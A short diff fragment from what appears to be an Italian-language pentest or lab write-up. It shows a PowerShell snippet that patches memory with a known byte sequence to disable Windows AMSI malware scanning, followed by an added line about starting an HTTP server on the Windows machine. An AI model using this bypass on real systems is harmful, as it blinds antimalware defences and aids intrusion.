@@ -391,4 +391,4 @@ $p = 0
 $Patch = [Byte[]] (0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3)
 [System.Runtime.InteropServices.Marshal]::Copy($Patch, 0, $Address, 6)
 ```
-
+Apriamo un server http e lanciamolo sulla macchina windows
